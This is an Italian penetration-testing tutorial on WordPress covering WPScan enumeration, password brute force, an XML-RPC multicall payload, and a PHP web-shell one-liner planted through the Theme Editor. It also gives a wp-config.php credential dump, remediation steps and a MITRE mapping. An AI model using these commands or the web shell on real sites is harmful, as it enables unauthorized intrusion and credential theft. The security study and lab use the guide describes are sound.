> [English](README.en.md) | **Italiano**

# CMS exploitation: WordPress & WPScan

> - **Fase:** Web Attack - CMS Exploitation (WordPress)
> - **Visibilita:** Media - WPScan genera traffico HTTP strutturato, rilevabile da WAF e IDS
> - **Prerequisiti:** WordPress identificato dalla fase di tech profiling, pagina `/wp-login.php` accessibile, API token WPScan (opzionale per dati plugin aggiuntivi)
> - **Output:** Versione WordPress, lista plugin con CVE, lista utenti, eventuale accesso admin tramite brute force

---

## Introduzione

WordPress e il CMS piu diffuso al mondo con oltre il 43% del mercato web. La sua popolarita lo rende il target piu frequente nei web application penetration test. La sua architettura a plugin introduce una superficie di attacco frammentata: il core di WordPress e generalmente sicuro nelle versioni recenti, ma le vulnerabilita si trovano quasi sempre nei plugin di terze parti.

Il ciclo di attacco su WordPress segue quattro fasi distinte, ciascuna con strumenti specifici:

1. **Fingerprinting:** confermare la versione di WordPress e identificare il tema attivo.
2. **Enumerazione:** plugin installati (e le loro versioni), utenti, file di configurazione esposti.
3. **Verifica CVE:** incrociare le versioni trovate con il database delle vulnerabilita note di WPScan.
4. **Exploitation:** brute force sulle credenziali admin, o exploit diretto di un plugin vulnerabile.

WPScan e lo strumento de facto per questo lavoro: un black-box scanner open-source scritto in Ruby, specificamente progettato per WordPress, con un database di vulnerabilita aggiornato quotidianamente (wpscan.com/wordpress-security-database).

---

## Fase 1: fingerprinting

La conferma della versione e il prerequisito per il CVE mapping. WordPress espone la versione in piu punti:

```Bash
# Identificazione versione tramite WhatWeb
whatweb -v http://<TARGET>

# Verifica diretta dei file che espongono la versione
curl -s http://<TARGET>/readme.html | grep -i "version"
curl -s http://<TARGET>/wp-includes/version.php
```

Output di esempio (readme.html):

```
WordPress 6.2.2
...
WordPress is web software you can use to create a beautiful website, blog, or app.
```

Il file `readme.html` e spesso lasciato accessibile per default e rivela la versione esatta. In un engagement reale, la sua rimozione e una delle prime remediation da raccomandare.

---

## Fase 2: enumerazione con WPScan

### Installazione

```Bash
# Su Kali Linux (preinstallato)
wpscan --version

# Aggiornamento database vulnerabilita
wpscan --update
```

### Enumerazione completa

```Bash
# Scansione base con enumerazione di plugin vulnerabili, temi e utenti
wpscan --url http://<TARGET> --enumerate vp,vt,u

# Opzioni:
#   vp  = vulnerable plugins (plugin con CVE note)
#   vt  = vulnerable themes (temi con CVE note)
#   u   = users (enumerazione utenti)
#   ap  = all plugins (tutti i plugin, anche senza CVE)
#   at  = all themes
```

Output di esempio (enumerazione plugin):

```
[+] Enumerating Vulnerable Plugins

[i] Plugin(s) Identified:

[+] contact-form-7
 | Location: http://target.com/wp-content/plugins/contact-form-7/
 | Last Updated: 2023-11-20T09:00:00.000Z
 | [!] The version is out of date, the latest version is 5.8.4
 | Version: 5.7.4 (100% confidence)                               <-- versione obsoleta
 |
 | Found By: Readme File Disclosure (Aggressive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Contact Form 7 <= 5.8.3 - Reflected Cross-Site Scripting   <-- CVE
 |     Fixed in: 5.8.4
 |     References:
 |      - https://wpscan.com/vulnerability/xxxxx
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-XXXXX
```

### Enumerazione utenti

```Bash
wpscan --url http://<TARGET> --enumerate u
```

Output di esempio:

```
[+] Enumerating Users

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Login Error Messages (Aggressive Detection)
 |  WP JSON API (Aggressive Detection) -> http://target.com/?author=1

[+] editor_john
 | Found By: Author Posts - Author Pattern (Passive Detection)       <-- username esposto
```

Il fatto che WordPress esponga gli username tramite l'API REST (`/?author=1`) e una misconfiguration strutturale che facilita il brute force sulle credenziali.

---

## Fase 3: brute force delle credenziali

```Bash
# Brute force con lista di password (rockyou.txt o lista custom)
wpscan --url http://<TARGET> --usernames admin,editor_john --passwords /usr/share/wordlists/rockyou.txt

# Con throttling per evitare lockout
wpscan --url http://<TARGET> --usernames admin -P passlist.txt --throttle 3000
# --throttle 3000 -> attendi 3 secondi tra ogni tentativo
```

Output di esempio (credenziale trovata):

```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / password123                             <-- CREDENZIALE VALIDA

[!] Valid Combinations Found:
 | Username: admin, Password: password123
```

---

## Fase 4: Post-Authentication exploitation

Ottenuto l'accesso admin, le azioni post-exploitation piu comuni:

**Deploy Web Shell via Theme Editor:**

```Bash
# 1. Accedere a: Appearance -> Theme Editor -> header.php (o functions.php)
# 2. Iniettare codice PHP per eseguire comandi di sistema:
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
# 3. Chiamare la Web Shell:
#    http://<TARGET>/wp-content/themes/<TEMA>/header.php?cmd=id
```

**Accesso al database tramite phpMyAdmin (se esposto):**

```Bash
# Controllare se phpMyAdmin e accessibile
curl -s http://<TARGET>/phpmyadmin/
curl -s http://<TARGET>/pma/
```

**Dump credenziali dal file `wp-config.php`:**

```Bash
# Se si ha RCE, leggere le credenziali del database
cat /var/www/html/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST"
```

---

## Remediation

- **Azione immediata:** rimuovere `readme.html` e tutti i file che espongono la versione (`/wp-includes/version.php` deve essere inaccessibile via web).
- **Aggiornamenti:** mantenere aggiornati WordPress core, tutti i plugin e i temi. Abilitare gli aggiornamenti automatici per le patch di sicurezza.
- **Username:** disabilitare l'enumerazione utenti tramite l'API REST: aggiungere una regola in `.htaccess` o usare un plugin di sicurezza (Wordfence, Sucuri) per bloccare `/?author=N`.
- **Login:** proteggere `/wp-login.php` con CAPTCHA, 2FA (Google Authenticator) e IP allowlisting per gli accessi admin. Considerare di spostare il login su un URL custom (plugin `WPS Hide Login`).
- **Principio del minimo privilegio:** rimuovere i plugin e i temi non utilizzati. Meno plugin = meno superficie di attacco.
- **Verifica:** rieseguire `wpscan --enumerate vp` dopo ogni aggiornamento per confermare che non ci siano piu plugin con CVE note.

---

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `wpscan` | wordpress scanner | cli - attiva | enumerazione completa e brute force su wordpress |
| `nuclei` | template-based | cli - attiva | template `/technologies/cms/wordpress/` per cve specifiche |
| `metasploit` | exploitation framework | cli/gui - attiva | exploit automatizzati per plugin wordpress vulnerabili |
| `burpsuite` | web proxy | gui - manuale | analisi manuale di funzionalita wordpress (idor, csrf) |
| `xmlrpc-scan` | xml-rpc tester | cli - attiva | test abuso dell'endpoint `xmlrpc.php` per brute force |

> **Nota API Token WPScan:** senza API token, WPScan non mostra le CVE specifiche per i plugin. Registrarsi gratuitamente su `wpscan.com` e aggiungere `--api-token <TOKEN>` al comando per abilitare il vulnerability database completo.

---

## Analisi a basso livello: architettura WordPress e superficie di attacco

### Struttura interna di WordPress

WordPress memorizza la configurazione critica in due punti: il file `wp-config.php` (credenziali database, secret keys, prefisso tabelle) e la tabella `wp_options` nel database (URL del sito, tema attivo, plugin attivi, ruoli utente).

```
Architettura WordPress (attacker's perspective):

wp-config.php               <- DB credentials, AUTH_KEY, SECURE_AUTH_KEY
    |
    v
MySQL Database
    +-- wp_users             <- user_login, user_pass (phpass hash), user_email
    +-- wp_usermeta          <- wp_capabilities (ruolo: administrator, editor, subscriber)
    +-- wp_options           <- siteurl, active_plugins (array serializzato), template
    +-- wp_posts             <- post_content (web shell target per Theme Editor injection)

Endpoint esposti:
    /wp-login.php            <- Form login (brute force target)
    /xmlrpc.php              <- XML-RPC multicall (brute force amplification)
    /wp-json/wp/v2/users     <- REST API user enumeration (ID, slug, name)
    /?author=1               <- Author archive redirect (rivela username)
    /wp-content/debug.log    <- PHP error log (info disclosure se WP_DEBUG_LOG=true)
```

### Password hashing: phpass e la cracking window

WordPress usa `phpass` (Portable PHP Hashing Framework) con Blowfish/bcrypt. L'hash ha il formato:

```
$P$B[22 caratteri salt+hash]

Esempio: $P$BYnF7FzX2JmF/4M.YVz6JqF2oiz9F.0
         ^  ^ ^
         |  | +-- 22 char: salt (8 char) + hash iterato
         |  +---- cost factor: 'B' = 8192 iterazioni MD5
         +------- prefix phpass ($P$ = portable hash)

Cracking speed (GPU RTX 4090):
- phpass MD5 ($P$):  ~25 MH/s con hashcat -m 400
- bcrypt ($2y$10$):  ~100 KH/s con hashcat -m 3200
- Confronto: MD5 raw: ~60 GH/s (2400x piu veloce di phpass)
```

Il cost factor 'B' (8192 iterazioni) rallenta il brute force ma non lo impedisce con password deboli. Un attaccante con accesso al database (SQLi o backup esposto) puo crackare password da dizionario in minuti.

### XML-RPC multicall: brute force amplification

L'endpoint `xmlrpc.php` accetta il metodo `system.multicall` che permette di testare centinaia di credenziali in una singola richiesta HTTP, bypassando rate limiting basato su richieste/minuto:

```xml
POST /xmlrpc.php
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
      <member><name>params</name><value><array><data>
        <value>admin</value><value>password1</value>
      </data></array></value></member>
    </struct></value>
    <!-- Ripetere per ogni password da testare - fino a 500+ per richiesta -->
  </data></array></value></param></params>
</methodCall>
```

Detection: cercare richieste POST a `/xmlrpc.php` con body size anomalo (>10KB) e `Content-Type: text/xml`.

### WPScan detection techniques

WPScan usa tecniche diverse per la detection dei plugin, con livelli di aggressivita configurabili:

| metodo | affidabilita | traffico | come funziona |
| :--- | :--- | :--- | :--- |
| passive (default) | bassa | minimo | analizza html, js, css per riferimenti a `/wp-content/plugins/` |
| aggressive | alta | Alto | richiede direttamente `/wp-content/plugins/<nome>/readme.txt` per ogni plugin nel database |
| mixed (default per vp) | media | Medio | passive prima, poi aggressive solo sui plugin trovati |

---

## Esperienza di laboratorio

La metodologia a quattro fasi (fingerprint, enumerazione, CVE mapping, exploitation) si e dimostrata il workflow standard per ogni assessment WordPress. Il punto critico e la Fase 2: senza API token WPScan, la scansione trova i plugin ma non mostra le CVE associate, rendendo l'output significativamente meno utile. La registrazione gratuita su wpscan.com (50 richieste/giorno) e sufficiente per assessment individuali.

Il brute force via `wp-login.php` ha evidenziato un aspetto operativo importante: WordPress non implementa nativamente rate limiting o account lockout. Senza plugin di protezione (Wordfence, Sucuri), non c'e limite ai tentativi di password. L'aggiunta del flag `--throttle 3000` e stata necessaria solo per evitare di sovraccaricare il server di test, non per evitare blocchi.

La post-exploitation tramite Theme Editor ha dimostrato che l'accesso admin a WordPress equivale a RCE: la possibilita di editare file PHP dal pannello web trasforma un credential compromise in una server compromise completa. La remediation piu efficace e disabilitare l'editing dei file (`define('DISALLOW_FILE_EDIT', true)` in `wp-config.php`), che rimuove il Theme/Plugin Editor dall'interfaccia admin.

La scoperta dell'endpoint XML-RPC (`xmlrpc.php`) ha rivelato un vettore di amplificazione spesso ignorato: `system.multicall` permette di testare centinaia di credenziali in una singola richiesta, bypassando protezioni basate su rate limiting per richiesta. La remediation corretta e disabilitare completamente XML-RPC se non necessario (molti plugin di security lo fanno automaticamente).

---

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| reconnaissance | active scanning: vulnerability scanning | `T1595.002` | scansione con wpscan per identificare plugin vulnerabili, versione wordpress e cve associate |
| reconnaissance | gather victim host info: software | `T1592.002` | fingerprinting della versione wordpress tramite `readme.html` e header http |
| discovery | account discovery | `T1087` | enumerazione degli username wordpress tramite l'api rest (`/?author=1`) con wpscan `--enumerate u` |
| credential access | brute force: password guessing | `T1110.001` | attacco dizionario su `/wp-login.php` con lista credenziali tramite wpscan |
| persistence | server software component: web shell | `T1505.003` | deploy di codice php nel theme editor di wordpress dopo accesso admin per mantenere la persistenza |
| execution | command and scripting interpreter: php | `T1059.006` | esecuzione di comandi di sistema tramite web shell php iniettata in `header.php` del tema |

---

> **Nota:** Le tecniche documentate in questa guida sono state praticate su istanze WordPress
> installate in ambienti di laboratorio locali e su piattaforme di pratica autorizzate (es.
> HackTheBox, TryHackMe, DVWP - Damn Vulnerable WordPress). L'utilizzo di WPScan su siti
> WordPress reali senza autorizzazione scritta del proprietario e vietato e costituisce un reato
> ai sensi dell'art. 615-ter c.p. e del Computer Fraud and Abuse Act (CFAA) per target USA.
